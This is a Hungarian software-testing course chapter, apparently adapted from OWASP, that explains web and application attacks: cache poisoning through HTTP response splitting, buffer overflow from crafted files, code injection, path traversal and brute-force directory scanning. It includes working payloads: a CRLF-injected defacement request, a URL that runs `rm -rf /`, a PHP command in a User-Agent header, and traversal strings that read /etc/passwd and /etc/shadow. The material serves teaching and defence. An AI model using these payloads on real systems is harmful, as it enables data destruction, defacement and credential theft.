6.1.1 Mûködés ellehetetlenítése – Cache Mérgezés
Leírás
A károsan felépített válasz hatása fölnagyítható, ha egy több felhasználó által használt web
cache tárolja vagy akár egyetlen egy felhasználó böngészõ cache-e. Ha egy választ egy
megosztott web cache-ben tárolnak, mint például amik legtöbbször találhatóak a proxy
szerverekben, akkor a cache minden használója mindaddig a káros tartalmat fogja kapni,
amíg a cache bejegyzést ki nem tisztították. Ehhez hasonlóan, ha a választ egy egyéni
felhasználó böngészõje cache-eli (tárolja), akkor az a felhasználó mindaddig a káros tartalmat
fogja kapni, amíg a cache bejegyzést meg nem tisztították, ebben az esetben csak a helyi
böngészõ másolata lesz érintve.
Hogy egy ilyen támadás sikeres legyen, a támadónak a következõket kell tennie:
• Megtalálni a sebezhetõ service kódot, amin keresztül több fejléccel terhelheti meg a
http fejléc mezõjét.
• Rákényszeríteni a cache szervert, hogy flush-olja az aktuális cache tartalmat, amit
szeretnénk, hogy cache-eljen a szerver.
• Küldeni egy speciálisan elkészített kérelmet, amit a cache tárolni fog.
• Küldeni a következõ kérelmet. A korábban befecskendezett, a cache-ben eltárolt
tartalom lesz a válasz erre a kérelemre.
Ez a fajta támadás meglehetõsen nehezen kivitelezhetõ valós környezetben. A szükséges
feltételek listája hosszú és nehezen teljesíthetõ a támadó által. Ennek ellenére még mindig
egyszerûbb ezt a technikát használni, mint a Felhasználók Közötti Elcsúfítást (Cross-User
Defacement). 
Szoftver tesztelés
6-3
A Cache Mérgezés támadás a HTTP Válasz Szétválasztás (HTTP Response Splitting) és a
hálózati alkalmazás hibái miatt lehetséges. A támadó szempontjából létfontosságú, hogy az
alkalmazás engedélyezze a fejléc mezõ feltöltését több fejléccel a Kocsi Visszatérés (CR
(Carrige Return)) és a Sor Betáplálása (LF (Line Feed)) karaktereket használva.
Példa:
Találtunk egy weblapot, ami a szolgáltatási nevét a „page” argumentumtól kapja, aztán
visszairányít (302) ehhez a kiszolgálóhoz.
pl.: http://testsite.com/redir.php?page=http://other.testsite.com/
A redir.php példa kódja:
rezos@dojo ~/public_html $ cat redir.php
<?php
header ("Location: " . $_GET['page']);
?>
A megfelelõ kérelem elkészítése: [1]
1 – a lap eltávolítása a cache-bõl
GET http://testsite.com/index.html HTTP/1.1
Pragma: no-cache
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
A HTTP fejléc mezõk - "Pragma: no-cache" vagy "Cache-Control: no-cache" – eltávolítják a
lapot a cache-bõl (már ha tárolva volt benne természetesen).
2 – a HTTP Válasz Szétválasztást használva arra kényszerítjük a cache szervert, hogy
két választ generáljon egy kérelemre.
GET http://testsite.com/redir.php?site=%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLastModified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
nt-Length:%2020%0d%0aContentType:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
Szoftver tesztelés
6-4
Szándékosan állítjuk be a jövõ idõt (a fejlécben 2009. október 27-re van állítva) a második
válasz HTTP fejléc „Last-Modified” mezõjében, hogy tároljuk a választ a cache-ben.
Ezt a hatást megkaphatjuk a következõ fejlécek beállításával:
 Last-Modified [Utoljára-Módosítva] (Az „If-Modified-Since” fejléc ellenõrzi)
 ETag (Az „If-None-Match” fejléc ellenõrzi)
3 – küldjünk kérelmet a lapnak, amit szeretnénk kicserélni a szerver cache-ében
GET http://testsite.com/index.html HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
Elméletben a cache szervernek össze kellene párosítania a második választ a kettes
kérelembõl a hármas kérelemmel. Így kicseréltük a cache tartalmát.
A kérelem maradékét egyetlen kapcsolat alatt kivitelezni lehet (hacsak a cache szerver nem
igényli kifinomultabb módszer használatát), valószínûleg az egyiket azonnal a másik után.
Ennek a támadásnak a használata problémásnak tûnhet, ha általános Cache Mérgezési
megoldásként szeretnénk használni. Ez a cache szerverek különbözõ kapcsolati modellje és
kérelem feldolgozási megoldása miatt van így. Mit jelent ez? Például azt, hogy az a módszer,
amivel az Apache 2.x cache-ét a mod_proxy és mod_cache modulokkal hatékonyan tudjuk
mérgezni, nem fog mûködni a Squid esetében.
Egy másik probléma az URI hossza, ami idõnként lehetetlenné teszi, hogy betegyük a
szükséges válasz fejlécet, amit legközelebb a kérelemhez kellene párosítani a megmérgezett
laphoz.
Az felhasznált kérelem példák az alábbi linken[1] található dokumentumból származnak és a
cikk szükségleteinek megfelelõen lettek módosítva.
Az alábbi dokumentumban bõvebben olvashat ezekrõl a támadási fajtákról:
[1]http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf, készítette: Amit
Klein, Director of Security and Research
6.2 Adatszerkezet támadás - Bináris forrás fájl túltöltése
6.2.1 Leírás
A buffer túlcsordulás forrása a bevitt adat lehet. Amikor a bináris forrás file túltöltéssel
próbálkozik, a támadónak úgy kell módosítania/elõkészítenie a bináris fájlt, hogy miután az
alkalmazás beolvasta, kiszolgáltatottá váljon egy klasszikus Buffer túlcsordulás támadásnak
(Buffer overflow attack). Az egyetlen különbség ez és a klasszikus típus között a bevitt adat
forrásában van. A leggyakoribb példák a különlegesen elkészített MP3, JPEG vagy ANI
fájlok, amik buffer túlcsordulást okoznak.
6.2.2 Példák
Az alkalmazás kiolvassa az elsõ 8 karaktert a bináris fájlból.
rezos@dojo-labs ~/owasp/binary $ cat read_binary_file.c
Szoftver tesztelés
6-5
#include <stdio.h>
#include <string.h>
int main(void)
{
 FILE *f;
 char p[8];
 char b[8];
 f = fopen("file.bin", "r");
 fread(b, sizeof(b), 1, f);
 fclose(f);
 strcpy(p, b);
 printf("%s\n", p);
 return 0;
}
A létrehozott fájl több, mint 8 karaktert tartalmaz.
rezos@dojo-labs ~/owasp/binary $ cat file.bin
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA
Egy újabb, futtatásra tett próbálkozás után az alkalmazás a következõvel leáll:
rezos@dojo-labs ~/owasp/binary $ ./read_binary_file
Segmentation fault
Hiba. Vajon buffer túlcsordulás történt?
rezos@dojo-labs ~/owasp/binary $ gdb -q ./read_binary_file
Using host libthread_db library "/lib/libthread_db.so.1".
(gdb) r
Starting program: /home/rezos/owasp/binary/read_binary_file
Program received signal SIGSEGV, Segmentation fault.
0xb7e4b9e3 in strcpy () from /lib/libc.so.6
Igen, ez egy buffer túlcsordulás volt a strcpy() függvényben.
Miért?
fread(b, sizeof(b), 1, f); - karaktereket olvas a „stream f, sizeof(b)”-bõl egyszer a b
bufferbe. Ez teljesen rendben lévõnek tûnik. De valójában nincs hely egy '\0' számára, ami
lezárja a sztringet.
Az strcpy(p, b); végrehajtása közben, amikor mindkét buffer egyenlõ, megtörténik a
túlcsordulás. Ennek az oka a null bájt, mint végkarakter hiánya a b bufferben. A strcpy()
függvény mindent be fog másolni a b[0]-tól kezdve a p[] bufferbe egészen a null bájtig. A
támadó egy speciális fájl elkészítésével sikeresen véghezvitte a buffer túlcsordulás támadást. 
Szoftver tesztelés
6-6
 Használjunk egyenértékû, biztonságos függvényeket, amik ellenõrzik a buffer hosszát
amikor csak lehetséges.
Mégpedig:
 gets() -> fgets()
 strcpy() -> strncpy()
 strcat() -> strncat()
 sprintf() -> snprintf()
 Azokat a függvényeket, amiknek nincs biztonságos verziójuk, át kell írni oly módon,
hogy tartalmazzanak biztonsági ellenõrzéseket. Az erre szánt idõ meg fog térülni a
jövõben. Emlékezzen rá, hogy ezt csak egyszer kell megcsinálnia.
 Olyan fordítókat kell használni, amik képesek azonosítani a nem biztonságos
függvényeket, logikai függvényeket és ellenõrzik, hogy a memória nincs-e átírva
olyan helyen, ahol nem szabadna.
6.3 Kártékony kód beágyazása – Logikai/Idõzített bomba
6.3.1 Leírás
A fenyegetõ közeg a „támadók” egy olyan csoportja, ami támadást hajt végre. Lehetnek
emberi (szándékosak vagy szándékolatlanok) vagy természetes eredetûek (áradás, tûz, stb.).
1. A fenyegetõ közeg egy mondatos leírásával kezdõdik.
2. Kik azok az emberek, akikbõl ez a fenyegetési közeg felépül?
3. Meg kell vitatni a fenyegetõ közeg jellemzõit.
6.3.2 Kockázati tényezõk
 Beszéljünk azokról a tényezõkrõl (factors), amik ezt a fenyegetõ közeget valószínûleg
vagy kevésbé valószínûleg támadásra bírják.
 Biztosan szót kell ejteni a fenyegetõ közeg méretérõl, motivációjáról, képességeirõl és
lehetõségeirõl.
6.4 Trójai
6.4.1 Leírás
A Trójai olyan program ami megbízható alkalmazásnak álcázva tartalmaz ártalmas kódot. Az
ártalmas kód lehet egyébként hasznos alkalmazás része, rejtõzhet egy elektronikus levél
hivatkozása mögött vagy el lehet rejtve JavaScript-et futtató oldalakon, hogy titkos
támadásokat intézzen sebezhetõ internet böngészõk ellen.
További részleteket az Ember-a-böngészõ-támadások-mögött (Man-in-the-browser attack)
címû részben olvashat.
6.4.2 A Trójai 7 fõ típusa
1. Távoli Hozzáférésû Trójai (Remote Access Trojan; RAT): Arra tervezték, hogy teljes
irányításd biztosítson a támadónak a fertõzött számítógép fölött. Ezt a Trójait általában
segédprogramnak álcázzák.
2. Adatküldõ Trójai (Data Sending Trojan): Ez a fajta Trójai valamilyen
billentyûlenyomás-rögzítõ (keylogger) technológiát használ, hogy értékes adatokra 
Szoftver tesztelés
6-7
tegyen szert, például jelszavakra, hitelkártya és netbank adatokra vagy azonnali
üzenetekre, amiket aztán visszaküld a támadónak.
3. Megsemmisítõ Trójai (Destructive Trojan): Trójai, amit arra terveztem, hogy az
áldozat gépén tárolt adatokat megsemmisítse.
4. Proxy Trójai (Proxy Trojan): Ennek a Trójainak az a célja, hogy proxy szerverként
használja az áldozat számítógépét, lehetõséget biztosítva arra, hogy tiltott dolgokat
cselekedjen a fertõzött géprõl, például banki csalással próbálkozzon vagy akár káros
támadásokat indítson az interneten keresztül.
5. FTP Trójai (FTP Trojan): Ez a Trójai a 21-es porton keresztül csatlakozva lehetõvé
teszi a támadó számára, hogy FTP kapcsolatot létesítsen az áldozat gépével.
6. Biztonsági szoftver hatástalanító Trójai (Security software disabler Trojan): Ezt a
Trójait arra tervezték, hogy semlegesítse a tûzfalakhoz és vírusírtó programokhoz
hasonló biztonsági programokat, lehetõvé téve ez által a támadónak, hogy többfajta
inváziós technológiát is használhasson az áldozat számítógépére való behatoláshoz és
hogy még a számítógépen túli eszközöket is megfertõzze.
7. Szolgáltatás-megtagadás támadó Trójai (Denial-of-Service attack Trojan): Ezt a
Trójait arra tervezték, hogy lehetõséget biztosítson a támadónak Szolgáltatásmegtagadási támadás kivitelezésére az áldozat számítógépérõl.
6.4.3 Tünetek
Néhány gyakori tünet:
 A háttérkép vagy más háttérbeállítás magától megváltozik
 Az egérmutató eltûnik
 A programok maguktól betöltõdnek és kilépnek
 Állandóan furcsa figyelmeztetõ ablakok, üzenetek és kérdés dobozok jelennek meg
 Az e-mail kliens magától leveleket küld mindenkinek a felhasználó címlistájára
 A Windows magától leáll
 A rendszer magától újraindul
 Az internet hozzáférés adatai megváltoznak
 A felhasználó ez irányú tevékenysége nélkül is nagy az internetkapcsolat terheltsége
 A számítógép mûködése nagyon nagy erõforrásokat emészt fel (a számítógép lelassul)
 A Ctrl + Alt + Del gombkombináció nem mûködik
6.4.4 Kockázati tényezõk
Magas: A Trójai át tud törni bármilyen biztonsági védelmet a hálózatban, mivel a támadó
hozzáférhet egy, a hálózati bejelentkezéshez szükséges, tárolt tanúsítványokkal ellátott
munkaállomáshoz. Ezeknek a birtokában a támadó az egész hálózatot veszélyeztetheti.
6.5 Azonosítási folyamat kihasználása – Account kizárási támadás
6.5.1 Leírás
Egy account kizárási támadáskor a behatoló megpróbálja kizárni az összes felhasználói
accountot, általában oly módon, hogy több alkalommal hibás bejelentkezést produkál, mint
amennyi a bejelentkeztetõ rendszer tûréshatára. Ha például egy felhasználó három hibás
bejelentkezési próbálkozással zárja ki az account-ját a rendszerbõl, akkor a támadó nemes
egyszerûséggel úgy zárja ki az account-jaikat, hogy háromszor hibás hibás bejelentkezést
produkál. Ez a fajta támadás nagymértékû szolgáltatás-megtagadási támadást eredményezhet,
ha minden felhasználói account ki van zárva, fõként akkor, ha az accountok visszaállítása
komoly mennyiségû munkát igényel. 
Szoftver tesztelés
6-8
6.5.2 Például: eBay támadás
Az account kizárási támadásokat arra használják, hogy kihasználják azokat a
bejelentkeztetõ rendszereket, amik érzékenyek a szolgáltatás-megtagadásra. Az egyik
híres ilyesfajta támadás az eBay-t érte. Az eBay korábban megjelenítette a legmagasabb
licitet tartó felhasználó azonosítóját (azóta ezt már megváltoztatták). Az árverés utolsó
perceiben valaki megpróbált belépni a legmagasabb licitet tartó felhasználó nevében
három alkalommal. A három sikertelen próbálkozás után az eBay jelszó védelme életbe
lépett és kizárta a legmagasabb licitet tartó hozzáférését egy idõre. A támadó így
megtehette a saját ajánlatát, az áldozat pedig nem tudott fölémenni az ajánlatnak, mert
éppen ki volt zárva a rendszerbõl. Ezúton a támadó megnyerte az árverést.
6.6 Befecskendezés – Közvetlen statikus kód befecskendezése
6.6.1 Leírás
A közvetlen statikus kód befecskendezése általi támadás abból áll, hogy a kódot közvetlenül
az alkalmazás által használt erõforrásba juttatják bele, miközben egy felhasználó kérelme
éppen feldolgozás alatt van. Ez általában úgy történik, hogy befolyásolják a könyvtár és
sémafájlokat, amik a felhasználói kérelemnek megfelelõen lettek létrehozva az adatok
megfelelõ megválasztása nélkül. Egy, a módosított erõforráshoz beérkezõ felhasználói
kérelem esetén a benne foglalt cselekvés végrehajtódik a szerveroldalon a web szerver
folyamatának a függvényében.
A szerver oldali beszúrás (Server Side Includes) egy típusa a közvetlen statikus kód
befecskendezésének. Ez nem összekeverendõ a többi fajta kód befecskendezéssel, mint
amilyen az XSS („Kereszt-helyszíni szkriptelés” vagy „HTML befecskendezés”), aminél a
kód a kliens oldalán hajtódik végre.
6.6.2 Példák
Példa 1
Ez az egyszerû példa a CGISCRIPT.NET csSearch 2.3 egyik gyengeségének a kihasználását
mutatja be, amit a Bugtraq-on jelentettek meg, 4368-as azonosítószám alatt. A következõ
URL szerverre való meghívásával lehetséges a ‘’’’setup’’’ változóban meghatározott
parancsokat végrehajtani.
csSearch.cgi?command=savesetup&setup=PERL_CODE_HERE
A klasszikus példa szerint a következõ parancsot arra lehet használni, hogy minden fájlt
eltávolítsunk a “/” könyvtárból:
csSearch.cgi?command=savesetup&setup=`rm%20-rf%20/`
Tegyük hozzá, hogy a fönti parancsnak kódolva kell lennie, hogy elfogadható legyen.
Példa 2
Ez a példa egy, az Ultimate PHP Board (UPB) 1.9 (CVE-2003-0395)-ben lévõ sebezhetõ
pontot használ ki, lehetõvé téve a támadónak, hogy véletlenszerûen futtasson php kódokat.
Mindezt azért teszi, mert néhány, a felhasználóhoz tartozó változó, mint például az IP-cím
vagy a User-Agent egy olyan fájlban tárolódnak, amit az admin_iplog.php oldal használ, hogy
felhasználói statisztikákat mutasson. Amikor egy adminisztrátor ezt a lapot használja, akkor a
korábban egy káros kérelem által befecskendezett kód végrehajtódik. A következõ példa egy
ártalmas php kódot tartalmaz, ami belerondít az index.php lapba, amikor az adminisztrátor az
admin_iplog.php-t futtatja. 
Szoftver tesztelés
6-9
GET /board/index.php HTTP/1.0
User-Agent: <? system( "echo \'hacked\' > ../index.html" ); ?>
6.7 „Útkeresztezési támadás” (Path Traversal Attack)
6.7.1 Áttekintés
Az „útkeresztezési támadások” olyan fájlok és könyvtárak elérését célozzák, amik a hálózati
gyökér (web root) könyvtáron kívül vannak eltárolva. Az alkalmazás böngészése közben a
támadó olyan közvetlen hivatkozásokat keres, ami a web szerveren tárolt fájlokra mutatnak. A
„ ../ ” sorozatot és változóit tartalmazó fájlok manipulálásával lehetséges lehet tetszõleges
olyan fájlhoz vagy könyvtárhoz hozzáférni, ami a fájlrendszerben van tárolva, beleértve az
alkalmazások forráskódjait , konfigurációs- és a rendszer mûködése szempontjából kritikus
egyéb fájlokat, amit csak a rendszer hozzáférési mûveletek korlátoznak. A támadó “../”
sorozatokat használ, hogy följebb lépjen a gyökérkönyvtárba és így lehetõvé tegye a
fájlrendszerben való mozgást.
Ezt a támadást egy olyan külsõ ártalmas kód befecskendezésével lehet kivitelezni, ami a
Resource Ijection (Forrás befecskendezés) támadástípus által kitaposott ösvényt használja. A
támadás kivitelezéséhez nem szükséges különleges eszközök használata; a behatoló általában
valamilyen internetes fürkészt (web spider/crawler) használ, hogy felderítse az összes
használható URL-t.
Ezt a támadást több néven is ismerik, például:
 “dot-dot-slash” („pont-pont-vesszõcske”)
 “directory traversal” („könyvtárkeresztezés”)
 “directory climbing”(„könyvtármászás”)
 “backtracking” („visszakövetés”).
6.7.2 Leírás
Kérelem változatok
Kódolás és dupla kódolás:
%2e%2e%2f jelentése ../
%2e%2e/ jelentése ../
..%2f jelentése ../
%2e%2e%5c jelentése ..\
%2e%2e\ jelentése ..\
..%5c jelentése ..\
%252e%252e%255c jelentése ..\
..%255c jelentése ..\
és így tovább...
„Százalékos kódolás (más néven URL kódolás)” (Percent encoding (aka URL encoding))
Megjegyzés: a web tárolók egy szintnyi kódolást hajtanak végre a form-okról és az URL-ekrõl
származó százalékosan kódolt értékeken.
..%c0%af jelentése ../ 
Szoftver tesztelés
6-10
..%c1%9c jelentése ..\
Operációs rendszer specifikusan
UNIX
 Gyökérkönyvtár: “ / “
 Könyvtár elválasztó: “ / “
WINDOWS
 Gyökérkönyvtár: “ <partíció betûjele> : \ “
 Könyvtárelválasztó: “ / “ vagy “ \ ”
Megjegyzés: a Windows engedi, hogy a fájlneveket ráadás . \ / karakterek kövessék.
A legtöbb operációs rendszerben null bájtokat (%00) lehet injektálni a fájlnév lezárása
céljából. Például a következõ paraméter elküldése:
?file=secret.doc%00.pdf
azt eredményezi, hogy a Java alkalmazás úgy látja, hogy a sztring „.pdf”-el ér véget, míg az
operációs rendszer úgy látja, hogy a fájl végén ".doc" áll. A támadók ezt a trükköt arra
használhatják, hogy átjussanak az érvényesítõ rutinon.
6.7.3 Példák
Példa 1
A következõ példa megmutatja, hogy az alkalmazás hogyan bánik a használatban lévõ
erõforrásokkal:
 http://some_site.com.br/get-files.jsp?file=report.pdf
 http://some_site.com.br/get-page.php?home=aaa.html
 http://some_site.com.br/some-page.asp?page=index.html
Ebben a példában lehetséges olyan ártalmas sztringet beilleszteni, mint változó paramétert,
hogy hozzáférjünk a webes könyvtáron kívüli fájlokhoz.
http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file
A következõ URL-ek a *NIX jelszó fájl kihasználásának példáját mutatják be:
http://some_site.com.br/../../../../etc/shadow
http://some_site.com.br/get-files?file=/etc/passwd
Megjegyzés: Windows környezetben a támadó csak azon a partíción mozoghat, amin a webes
gyökérkönyvtár is található, míg Linux környezetben az egész merevlemezt bejárhatja.
Példa 2
Lehetséges ezentúl külsõ webhelyen található fájlok és szkriptek belefoglalása is.
http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/maliciuscode.php 
Szoftver tesztelés
6-11
Példa 3
Ez a példa azt az esetet mutatja be, mikor a támadó arra kényszerítette a szervert, hogy
megmutassa a CGI forráskódot.
http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi
Példa 4
Ez a példa a Wikipedia - Directory Traversal oldalról lett továbbgöngyölítve
A sebezhetõ alkalmazás kódjának tipikus példája:
<?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
 $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?>
Ez ellen a rendszer ellen a következõ HTTP kérelmet lehet támadásként használni:
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
A következõ szerver választ generáljuk:
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache
root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
Az ismételt ../ karakterek a /home/users/phpguru/templates/ után azt okozták, hogy
a include() átkerüljön a gyökérkönyvtárba és tartalmazza az /etc/passwd UNIX jelszó fájlt.
A UNIX etc/passwd egy szokásos fájl arra, hogy bemutassuk a directory traversal-t, mivel a
számítógépes kalózok gyakran használják arra, hogy jelszavakat törjenek fel.
6.7.4 „Abszolút útkeresztezés” (Absolute Path Traversal)
A következõ URL-ek érzékenyek lehetnek erre a támadásra:
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
A támadó a következõ módon kivitelezhet egy ilyen támadást:
http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
Szoftver tesztelés
6-12
Amikor a web szerver a webes alkalmazás hibáit tartalmazó információval tér vissza, akkor a
támadónak sokkal egyszerûbb kitalálni a pontos helyet (vagyis a forráskódot tartalmazó
fájlhoz vezetõ utat, amit aztán megjeleníthet).
6.8 „Próbálgatásos technikák – Nyers Erõ támadás” (Probabilistic
Techniques - Brute force attack)
6.8.1 Leírás
Ezzel a fajta támadással a behatoló megpróbálja úgy megkerülni a biztonsági
mechanizmusokat, hogy nagyon kevés információval rendelkezik róluk. A következõ módok
valamelyikét használhatja:
könyvtár támadás (mutációkkal vagy anélkül) (dictionary attack (with or without mutations))
nyers-erõ támadás (megadott csoportú karakterekkel, például: alfanumerikus, különleges,
„case-sensitive”) (brute-force attack )
A támadó megpróbálja elérni a célját. A megfelelõ paraméterek (egy bizonyos módszer, a
próbálkozások száma, a rendszer hatékonysága) figyelembe vételével, amik levezénylik a
támadást a behatoló megjósolhatja, hogy meddig kell tartania a támadásnak. A nem nyers-erõ
támadások (non brute-force attacks), amikben mindenféle karakter szerepel, nem
kecsegtetnek biztos sikerrel.
6.8.2 Példák
A Nyers-erõ támadásokat leginkább arra használják, hogy megtippeljék a jelszavakat és
megkerüljék a hozzáférési ellenõrzéseket. Mindemellett sok olyan eszköz van, amik ezt a
technológiát használják, hogy a támadó részérõl hasznosnak vélt információkat gyûjtsenek ki
bizonyos web szolgáltatások katalógusaiból. Nagyon sok esetben a támadások célpontjai a
különbözõ formátumokban lévõ adatok (GET/POST) és a felhasználói Session-ID-k.
Példa 1
Az elsõ forgatókönyvben, ahol az a Nyers-erõ célja, hogy megtudjuk a jelszót kódolatlan
formában. Úgy tûnik, hogy a John the Ripper egy nagyon hasznos eszköz. A 10 legjobb
jelszótörõ különbözõ módszerekkel, többek között Nyers-erõvel dolgoznak. Ezek
megtalálható az alábbi oldalon:
http://sectools.org/crackers.html
A web szolgáltatások tesztelésére a következõ eszközök állnak rendelkezésre:
 dirb (http://sourceforge.net/projects/dirb/)
 WebRoot (http://www.cirt.dk/tools/webroot/WebRoot.txt)
A dirb-höz fejlettebb eszközök is tartoznak. A segítségével képesek lehetünk:
 cooky-kat beállítani
 bármilyen HTTP fejlécet hozzáadni
 PROXY-t használni
 megtalált objektumokat mutálni
 http(s) kapcsolatokat tesztelni
 katalógusokban és fájlokban keresni meghatározott könyvtárak és sémák segítségével
 és még ezeknél sokkal többre is
A legegyszerûbben elvégezhetõ teszt a következõ: 
Szoftver tesztelés
6-13
rezos@dojo ~/d/owasp_tools/dirb $ ./dirb http://testsite.test/
-----------------
DIRB v1.9
By The Dark Raver
-----------------
START_TIME: Mon Jul 9 23:13:16 2007
URL_BASE: http://testsite.test/
WORDLIST_FILES: wordlists/common.txt
SERVER_BANNER: lighttpd/1.4.15
NOT_EXISTANT_CODE: 404 [NOT FOUND]
(Location: '' - Size: 345)
-----------------
Generating Wordlist...
Generated Words: 839
---- Scanning URL: http://testsite.test/ ----
FOUND: http://testsite.test/phpmyadmin/
 (***) DIRECTORY (*)
Az adatkivitelnél a támadó értesül róla, hogy a phpmyadmin/ katalógus megtalálásra került. A
támadó, aki tudja ezt, most már végrehajthatja a támadást ezen az alkalmazáson. A dirb sémái
között – többek között – van olyan könyvtár, ami érvénytelen httpd konfigurációkról
tartalmaz információt. Ez a könyvtár fölfedezi az ilyesfajta gyengeségeket.
Az egyik a fõ probléma a dirb-höz hasonló eszközökkel a felismerés, hogyha a szervertõl
kapott válasz mindig megbízható. A fejlettebb szerver konfigurációk segítségével (mint
amilyen a mod_rewrite) az automatizált eszközök nem tudják eldönteni, hogy a szerver
válasza hibát jelez vagy pedig az eszköz megtalálta a támadó által keresett fájlt.
A CIRT.DK által írt WebRoot.pl alkalmazás beépített szerver mechanizmusokat tartalmaz
arra, hogy kielemezze a szerver válaszait és a támadó által megadott frázis alapján
megmondja, hogy a szerveren van-e azt tartalmazó fájl.
Például:
Np.
./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -match "test" -url
"/private/<BRUTE>" -incremental lowercase -minimum 1 -maximum 1
oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00
o Webserver Bruteforcing 1.8 o
0 ************* !!! WARNING !!! ************ 0
0 ******* FOR PENETRATION USE ONLY ********* 0
0 ****************************************** 0
o (c)2007 by Dennis Rand - CIRT.DK o
oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00
[X] Checking for updates - NO CHECK
Szoftver tesztelés
6-14
[X] Checking for False Positive Scan - OK
[X] Using Incremental - OK
[X] Starting Scan - OK
 GET /private/b HTTP/1.1
 GET /private/z HTTP/1.1
[X] Scan complete - OK
[X] Total attempts - 26
[X] Sucessfull attempts - 1
oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00
A WebRoot.pl egy fájlt talált, a "/private/b"-t, a testsite.test-en, ami tartalmazza a „test”
frázist.
Egy másik példa arra, hogy megvizsgáljuk a változó értékeinek tartományát:
./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -diff "Error" -url
"/index.php?id=<BRUTE>" -incremental integer -minimum 1 -maximum 1
6.8.3 Védelmi eszközök
„Php Nyers-erõ-támadás érzékelõ” (Php-Brute-Force-Attack Detector)
http://yehg.net/lab/pr0js/files.php/php_brute_force_detect.zip
Felismeri, hogy a web szervert vizsgálja-e valamilyen Nyer-erõt használó eszköz, mint
amilyen a Wfuzz vagy az OWASP DirBuster, illetve vizsgálják-e sebezhetõség érzékelõk,
mint a Nessus, a Nikto, az Acunetix, stb. Ez segít gyorsan azonosítani a próbálkozó rossz
fiúkat, akik ki akarják használni a biztonsági pajzs réseit.
http://yehg.net/lab/pr0js/tools/php-brute-force-detector-readme.pdf
6.8.4 „Protokol Manipuláció – http Válasz Elosztás” (Protocol Manipulation - Http
Response Splitting)
6.8.4.1 Leírás
HTTP válasz elosztás (HTTP response splitting) történik, amikor:
 Adat kerül a webes alkalmazásba rendezetlen forráson keresztül, ami legtöbbször egy
HTTP kérelem.
 Az adat egy HTTP válasz fejlécben szerepel, amit egy web használónak küldtek
anélkül, hogy a káros karaktereket ellenõrzése megtörtént volna.
A „HTTP response splitting” a befejezés egy módja, nem pedig a befejezés maga. Alapjaiban
véve a támadás meglehetõsen egyszerû: a támadó káros adatot továbbít egy sebezhetõ
alkalmazásnak, az alkalmazás pedig beleteszi az adatot a HTTP válasz fejlécébe.
A sikeres támadás érdekében, az alkalmazásnak engedélyeznie kell az olyan adatbevitelt, ami
CR (carriage return, %0d vagy \r) és LF (line feed, %0a vagy \n) karaktereket is beenged a
fejlécbe. Ezek a karakterek nem csak irányítást adnak a támadónak az alkalmazás által
küldeni szándékozott válasz maradék fejléce és fõrésze fölött, de azt is lehetõvé teszik, hogy
újabb, teljesen az irányítása alatt lévõ válaszokat adjon. 
Szoftver tesztelés
6-15
6.8.4.2 Példák
A következõ kódrészlet kiolvassa egy weblog szerzõjének a nevét egy HTTP kérelembõl és
cookie fejlécként beállítja egy HTTP válaszban.
 String author = request.getParameter(AUTHOR_PARAM);
 ...
 Cookie cookie = new Cookie("author", author);
 cookie.setMaxAge(cookieExpiration);
 response.addCookie(cookie);
Ha feltételezzük, hogy olyan sztringet küldünk el a kérelemben, ami csupa normál
alfanumerikus karakterbõl áll, mint például „Jane Smith”, akkor a HTTP válasz, ami ezt a
cookie-t tartalmazza a következõ formájú lehet:
 HTTP/1.1 200 OK
 ...
 Set-Cookie: author=Jane Smith
 ...
De mivel a cookie értéke ellenõrizetlen felhasználói adatbevitelbõl lett formázva, a válasz
csak akkor fogja fenntartani ezt a formát, ha az AUTHOR_PARAM-nak küldött érték nem
tartalmaz CR vagy LF karaktereket. Ha a támadó küld egy káros sztringet, mint például
"Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", akkor a HTTP válasz két különbözõ válaszra
lenne bontva, a következõ formában:
 HTTP/1.1 200 OK
 ...
 Set-Cookie: author=Wiley Hacker

 HTTP/1.1 200 OK
 ...
Nyilvánvaló, hogy a második választ teljesen a támadó irányítja, olyan tartalmú fejlécet és
törzset ad neki, amilyet szeretne. Az, hogy a támadó olyan HTTP választ generál, amit akar,
lehetõvé tesz több más fajta támadást is, többek között a következõket:
Cross-User Defacement, Cache Poisoning, Cross-site Scripting (XSS) és Page Hijacking.
